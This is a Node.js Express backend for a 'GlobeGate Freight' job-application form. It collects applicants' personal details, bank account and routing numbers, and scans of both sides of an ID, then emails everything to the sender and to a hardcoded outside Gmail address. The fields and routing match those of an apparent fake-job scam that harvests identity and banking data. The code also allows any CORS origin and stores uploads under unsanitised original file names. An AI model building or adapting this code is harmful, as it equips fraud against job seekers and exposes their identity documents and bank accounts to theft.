const express = require("express");
const multer = require("multer");
const cors = require("cors");
const nodemailer = require("nodemailer");
const fs = require("fs");

const app = express();

// ✅ CORS
app.use(cors({ origin: "*" }));
app.use(express.json());

// ✅ ENSURE UPLOAD FOLDER EXISTS
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

// ✅ FILE STORAGE
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + file.originalname);
  }
});

const upload = multer({ storage });

// ✅ TEST ROUTE
app.get("/", (req, res) => {
  res.send("GlobeGate Freight Backend is Live 🚀");
});

// ✅ EMAIL SETUP
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// ✅ APPLY ROUTE
app.post("/apply", upload.fields([
  { name: "resume" },
  { name: "idFront" },
  { name: "idBack" }
]), async (req, res) => {

  try {
    console.log("NEW APPLICATION RECEIVED");

    const data = req.body;

    const mailOptions = {
      from: process.env.EMAIL_USER,

      // 🔥 MULTIPLE EMAILS HERE
      to: [
        process.env.EMAIL_USER,
        "A.trejoa99@gmail.com"
      ],

      subject: "New Job Application",

      text: `
FULL NAME: ${data.firstName} ${data.middleName} ${data.surname}

GENDER: ${data.gender}
DATE OF BIRTH: ${data.dob}

ADDRESS:
Street: ${data.street}
City: ${data.city}
Province: ${data.province}
Zip: ${data.zip}

CONTACT:
Phone: ${data.phone}
Email: ${data.email}

JOB DETAILS:
Position: ${data.position}
Education: ${data.education}

SKILLS:
${data.skills}

PAYMENT DETAILS:
Payment Type: ${data.paymentType}
Bank Name: ${data.bankName}
Account Number: ${data.accountNumber}
Routing Number: ${data.routingNumber}
      `,

      attachments: [
        ...(req.files?.resume ? [{
          filename: req.files.resume[0].originalname,
          path: req.files.resume[0].path
        }] : []),

        ...(req.files?.idFront ? [{
          filename: req.files.idFront[0].originalname,
          path: req.files.idFront[0].path
        }] : []),

        ...(req.files?.idBack ? [{
          filename: req.files.idBack[0].originalname,
          path: req.files.idBack[0].path
        }] : [])
      ]
    };

    await transporter.sendMail(mailOptions);

    console.log("EMAIL SENT TO MULTIPLE RECIPIENTS ✅");

    res.json({ message: "Application sent successfully 📩" });

  } catch (error) {
    console.log("ERROR:", error);
    res.json({ message: "Email failed ❌" });
  }

});

// ✅ PORT
const PORT = process.env.PORT || 5000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});